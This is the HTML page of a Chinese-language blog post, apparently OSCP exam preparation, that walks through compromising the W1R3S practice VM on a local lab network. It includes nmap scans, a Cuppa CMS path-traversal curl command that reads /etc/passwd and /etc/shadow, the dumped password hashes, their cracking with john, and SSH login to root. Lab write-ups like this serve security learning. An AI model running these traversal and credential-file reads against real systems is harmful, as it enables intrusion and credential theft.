@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="W1R3S靶机wp明确目标内网网段扫描1nmap -sn 192.168.137.0&#x2F;24  ​	此处为本地靶机，目标ip地址为：192.168.137.4 信息收集阶段主动扫描tcp扫描(SYN扫描)1nmap -sS --min-rate 10000 -p- 192.168.137.4   扫描获得21，22，80，3306端口开放 然后对指定端口进行进一步的扫描  1nmap -sS -sV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="w1r3s">
+<meta property="og:url" content="http://example.com/undefined/af55ad8e.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="W1R3S靶机wp明确目标内网网段扫描1nmap -sn 192.168.137.0&#x2F;24  ​	此处为本地靶机，目标ip地址为：192.168.137.4 信息收集阶段主动扫描tcp扫描(SYN扫描)1nmap -sS --min-rate 10000 -p- 192.168.137.4   扫描获得21，22，80，3306端口开放 然后对指定端口进行进一步的扫描  1nmap -sS -sV">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/w1r3s/image-20221220200652159.png">
+<meta property="article:published_time" content="2022-12-20T12:42:32.000Z">
+<meta property="article:modified_time" content="2023-03-06T14:04:53.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/w1r3s/image-20221220200652159.png">
+
+<link rel="canonical" href="http://example.com/undefined/af55ad8e.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>w1r3s | So1Lupus</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">So1Lupus</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">So1Lupus</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/af55ad8e.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          w1r3s
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-20 20:42:32" itemprop="dateCreated datePublished" datetime="2022-12-20T20:42:32+08:00">2022-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-06 22:04:53" itemprop="dateModified" datetime="2023-03-06T22:04:53+08:00">2023-03-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="W1R3S靶机wp"><a href="#W1R3S靶机wp" class="headerlink" title="W1R3S靶机wp"></a>W1R3S靶机wp</h1><h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><h3 id="内网网段扫描"><a href="#内网网段扫描" class="headerlink" title="内网网段扫描"></a>内网网段扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.137.0/24</span><br></pre></td></tr></table></figure>
+
+<p>​	此处为本地靶机，目标ip地址为：192.168.137.4</p>
+<h2 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h2><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><h4 id="tcp扫描-SYN扫描"><a href="#tcp扫描-SYN扫描" class="headerlink" title="tcp扫描(SYN扫描)"></a>tcp扫描(SYN扫描)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS --min-rate 10000 -p- 192.168.137.4 </span><br></pre></td></tr></table></figure>
+
+<p>扫描获得21，22，80，3306端口开放</p>
+<p>然后对指定端口进行进一步的扫描 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -O -p21,22,80,3306 192.168.137.4</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">TCPscan</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:59:30:73 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>​	进一步利用nmap自带的vuln脚本进行简单漏扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -script=vuln -p21,22,80,3306 192.168.137.4</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --min-rate 10000 -p- 192.168.137.4</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE  SERVICE</span><br><span class="line">3306/udp closed mysql</span><br><span class="line">MAC Address: 00:0C:29:59:30:73 (VMware)</span><br></pre></td></tr></table></figure>
+
+<h2 id="FTP端口"><a href="#FTP端口" class="headerlink" title="FTP端口"></a>FTP端口</h2><p>存在ftp端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.137.4</span><br></pre></td></tr></table></figure>
+
+<p>进入到ftp服务器中，此处利用匿名进行试探</p>
+<p>即用户名为:anonymous，密码为空</p>
+<p>成功登录。</p>
+<p>进入后有三个目录，总体内容信息整理如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">02.txt</span><br><span class="line"></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce : MD5 : This is not a password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg== : base64 : It is easy, but not that easy..</span><br><span class="line"></span><br><span class="line">03.txt </span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line"></span><br><span class="line">employs-name.txt</span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">worktodo.txt</span><br><span class="line">we have a ןot of work to do‘ stop pןayıng around˙˙˙˙</span><br><span class="line">ı don&#x27;t thınk thıs ıs the way to root!</span><br></pre></td></tr></table></figure>
+
+<p>可以发现此处并没有我们想要的信息</p>
+<h2 id="80端口探测"><a href="#80端口探测" class="headerlink" title="80端口探测"></a>80端口探测</h2><p>利用浏览器登入，发现没有用</p>
+<p><img src="/./w1r3s/image-20221220200652159.png" alt="image-20221220200652159"></p>
+<p>然后进行目录爆破，利用feroxburster进行爆破，获取有效信息整理如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.4/</span><br><span class="line">http://192.168.137.4/administrator :Cuppa CMS</span><br><span class="line">http://192.168.137.4/javascript =&gt; http://192.168.137.4/javascript/</span><br><span class="line">http://192.168.137.4/wordpress =&gt; http://192.168.137.4/wordpress/</span><br><span class="line">http://192.168.137.4/javascript/jquery =&gt; http://192.168.137.4/javascript/jquery/</span><br><span class="line">http://192.168.137.4/administrator/components =&gt; http://192.168.137.4/administrator/components/</span><br><span class="line">http://192.168.137.4/administrator/templates =&gt; http://192.168.137.4/administrator/templates/</span><br><span class="line">http://192.168.137.4/administrator/media =&gt; http://192.168.137.4/administrator/media/</span><br><span class="line">http://192.168.137.4/administrator/language =&gt; http://192.168.137.4/administrator/language/</span><br><span class="line">http://192.168.137.4/administrator/js =&gt; http://192.168.137.4/administrator/js/</span><br><span class="line">http://192.168.137.4/administrator/api =&gt; http://192.168.137.4/administrator/api/</span><br><span class="line">http://192.168.137.4/administrator/classes =&gt; http://192.168.137.4/administrator/classes/</span><br><span class="line">http://192.168.137.4/wordpress/wp-includes =&gt; http://192.168.137.4/wordpress/wp-includes/</span><br><span class="line">http://192.168.137.4/wordpress/wp-admin =&gt; http://192.168.137.4/wordpress/wp-admin/</span><br><span class="line">http://192.168.137.4/administrator/api/administrator =&gt; http://192.168.137.4/administrator/api/administrator/</span><br><span class="line">http://192.168.137.4/administrator/api/test =&gt; http://192.168.137.4/administrator/api/test/</span><br><span class="line">http://192.168.137.4/wordpress/wp-content =&gt; http://192.168.137.4/wordpress/wp-content/</span><br><span class="line">http://192.168.137.4/administrator/classes/ajax =&gt; http://192.168.137.4/administrator/classes/ajax/</span><br><span class="line">http://192.168.137.4/administrator/components/menu =&gt; http://192.168.137.4/administrator/components/menu/</span><br><span class="line">http://192.168.137.4/administrator/components/menu/classes =&gt; http://192.168.137.4/administrator/components/menu/classes/</span><br><span class="line">http://192.168.137.4/administrator/components/menu/html =&gt; http://192.168.137.4/administrator/components/menu/html/</span><br><span class="line">http://192.168.137.4/administrator/templates/default =&gt; http://192.168.137.4/administrator/templates/default/</span><br><span class="line">http://192.168.137.4/administrator/installation =&gt; http://192.168.137.4/administrator/installation/</span><br><span class="line">http://192.168.137.4/administrator/components/stats =&gt; http://192.168.137.4/administrator/components/stats/</span><br><span class="line">http://192.168.137.4/administrator/components/permissions =&gt; http://192.168.137.4/administrator/components/permissions/</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，内容主要有三类，一类是wordpress目录下的，一类是javascript目录下的，一类是administrator目录下的。这都是我们的可利用攻击面，此处我选择了先对administrator进行探测。</p>
+<p>然后获取到几个信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cuppa Cms</span><br><span class="line">Administrator account :default:  username::admin password::admin  </span><br><span class="line">Administrator&#x27;s user created  No =&gt; admin account already have </span><br></pre></td></tr></table></figure>
+
+<p>然后利用searchsploit对cuppa cms进行了简单搜查，然后搜查到了一个任意文件包含漏洞</p>
+<p>有可能跟编码有关，但我们同时也可以注意到这里是Request，所以我们在尝试一下利用post进行访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d urlConfig=../../../../../../../../../../../etc/passwd http://192.168.137.4/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>
+
+
+<p>发现成功利用，于是我们在试着能不能搜集到&#x2F;etc&#x2F;shadow的信息，发现可以搜集到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line">sync:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>然后利用john进行破解，发现成功破解到密码</p>
+<p>www-data         (www-data)<br>computer         (w1r3s)</p>
+<p>于是我们利用ssh登陆上，然后再查看sudo的权限,发现此处w1r3s的权限都是ALL，可以说明，此台机器已经全部拿下。<br>并在&#x2F;root目录下找到了flag.txt文件</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSCP%E5%A4%87%E8%80%83/" rel="tag"># OSCP备考</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/3418e521.html" rel="prev" title="nodejs">
+      <i class="fa fa-chevron-left"></i> nodejs
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/undefined/442af4ad.html" rel="next" title="Road to OSCP-2 Lame">
+      Road to OSCP-2 Lame <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#W1R3S%E9%9D%B6%E6%9C%BAwp"><span class="nav-number">1.</span> <span class="nav-text">W1R3S靶机wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%8E%E7%A1%AE%E7%9B%AE%E6%A0%87"><span class="nav-number">1.1.</span> <span class="nav-text">明确目标</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%BD%91%E6%AE%B5%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">内网网段扫描</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%98%B6%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">信息收集阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.1.</span> <span class="nav-text">主动扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tcp%E6%89%AB%E6%8F%8F-SYN%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">tcp扫描(SYN扫描)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#udp%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">udp扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FTP%E7%AB%AF%E5%8F%A3"><span class="nav-number">1.3.</span> <span class="nav-text">FTP端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.4.</span> <span class="nav-text">80端口探测</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">So1Lupus</p>
+  <div class="site-description" itemprop="description">So1Lupus的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
